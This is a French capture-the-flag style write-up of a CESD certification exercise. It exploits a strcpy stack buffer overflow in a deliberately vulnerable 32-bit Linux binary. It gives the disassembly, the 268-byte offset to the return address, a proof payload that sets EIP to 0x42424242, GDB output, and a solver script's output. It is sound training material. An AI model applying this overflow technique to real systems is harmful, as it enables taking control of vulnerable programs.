# cesd_dvl_assessment_1 — zero (« 01_exploitme01 »)

- **Site** : [crackmes.one/crackme/5ab77f5333c5d40ad448c11c](https://crackmes.one/crackme/5ab77f5333c5d40ad448c11c) (réimport crackmes.de)
- **Auteur** : zero
- **Plateforme** : Unix/Linux — ELF 32-bit (Intel i386), non strippé, avec `debug_info`
- **Langage** : C (GCC 3.3.4, Debian) — compilé sous *Damn Vulnerable Linux*
- **Difficulté** : 1.0 · **Qualité** : 4.0
- **Publié** : 2018-03-25 (réimport) — exercice daté de 2006

> Ce n'est **pas** un keygen. C'est le *Practical Assessment 01* de la
> certification **CESD** (Certified Exploit & Shellcode Developer) d'IITAC,
> fourni avec son workbook PDF. L'objectif annoncé dans le PDF : *« Show the
> candidate's understanding on how to exploit and analyse a simple buffer
> overflow. »* La « solution » attendue est donc la prise de contrôle du flot
> d'exécution via un dépassement de tampon, pas un mot de passe.

## Le binaire

Le ZIP contient deux fichiers :

- `01_exploitme01` — l'ELF 32-bit à exploiter ;
- `IITAC_CESD_Exercises.pdf` — le cahier d'exercices de la certification.

```
$ file 01_exploitme01
ELF 32-bit LSB executable, Intel i386, dynamically linked,
interpreter /lib/ld-linux.so.2, for GNU/Linux 2.2.0, with debug_info, not stripped
```

SHA-256 de l'ELF extrait : `aa6b8fbae50d3efc8ca18d830cfa2a31d6a44b66a0bd87b7676d62778ee8eca9`.

## Comment on trouve

`main` est minuscule — un `objdump -d -M intel` suffit :

```asm
08048384 <main>:
 8048384: push   ebp
 8048385: mov    ebp,esp
 8048387: sub    esp,0x118          ; réserve 0x118 octets de pile
 804838d: and    esp,0xfffffff0
 ...
 8048397: mov    eax,[ebp+0xc]       ; argv
 804839a: add    eax,0x4            ; &argv[1]
 804839d: mov    eax,[eax]          ; argv[1]
 804839f: mov    [esp+0x4],eax       ; arg 2 de strcpy = source
 80483a3: lea    eax,[ebp-0x108]     ; arg 1 = dest = buf
 80483a9: mov    [esp],eax
 80483ac: call   80482b0 <strcpy@plt>
 80483b1: mov    eax,0x0
 80483b6: leave
 80483b7: ret
```

Tout le programme tient là : il copie `argv[1]` dans un tampon local
`buf = [ebp-0x108]` avec `strcpy`, **sans contrôle de longueur**. Classique
débordement de pile.

### Offset jusqu'à l'adresse de retour

Le tampon commence à `ebp-0x108`. Sur la pile i386 (32-bit), juste après le
cadre local on trouve l'`ebp` sauvegardé (`ebp+0`) puis l'adresse de retour
(`ebp+4`). La distance du début du tampon jusqu'à l'adresse de retour est donc :

```
0x108 (taille du buffer)  +  4 (ebp sauvegardé)  =  0x10c  =  268 octets
```

Les octets **268..271** de l'argument écrasent donc l'adresse de retour, c'est
à dire la future valeur d'EIP au `ret`.

### Payload

```
"A" * 268  +  <adresse sur 4 octets little-endian>
```

Pour prouver le contrôle, on met `"BBBB"` (= `0x42424242`) à cet emplacement.

## Vérification

Live, sans débogueur (le processus plante sur l'EIP corrompu) :

```
$ ./01_exploitme01 $(python3 -c 'print("A"*268+"BBBB")')
Segmentation fault      (return code 139)
```

### Debug GDB

On confirme qu'EIP vaut exactement `0x42424242` (nos « BBBB ») au moment du
crash — l'adresse de retour a bien été remplacée :

```
$ gdb -q ./01_exploitme01
(gdb) run $(python3 -c 'print("A"*268+"BBBB")')

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) info registers eip
eip            0x42424242          0x42424242
```

EIP = `0x42424242` : on contrôle le flot d'exécution. En remplaçant ces
4 octets par l'adresse d'un shellcode (poussé dans l'argument, ou via
`ret2libc`/`ret2reg` sur un système sans NX), on obtiendrait l'exécution de
code — c'est l'objet des exercices suivants du workbook.

## Solveur

[`tools/crackmes-de-cesd_dvl_assessment_1-solve.py`](tools/crackmes-de-cesd_dvl_assessment_1-solve.py) :

```
$ ./tools/crackmes-de-cesd_dvl_assessment_1-solve.py
offset EIP        : 268
EIP cible         : 0x42424242
payload (len=272) : b'AAAAAAAAAAAAAAAA'...b'BBBB'

$ ./tools/crackmes-de-cesd_dvl_assessment_1-solve.py --gdb   # extrait l'ELF du zip
eip            0x42424242          0x42424242
EIP controle : OUI
```

Le script extrait l'ELF depuis `original/CESD_Assessment01.zip` (il ne touche
pas à `original/`), lance le binaire avec le payload (`--run`, SIGSEGV attendu)
ou vérifie EIP sous GDB (`--gdb`).

## Réponse

| | |
|---|---|
| Vulnérabilité | `strcpy(buf[0x108], argv[1])` dans `main`, sans borne |
| Offset vers l'adresse de retour | **268 octets** (`0x108` + 4) |
| Payload de preuve | `"A"*268 + "BBBB"` → EIP = `0x42424242` |

Exemple (convention `petik` du dépôt) : `./01_exploitme01 $(python3 -c 'print("A"*268+"BBBB")')` fait planter le binaire avec EIP contrôlé.
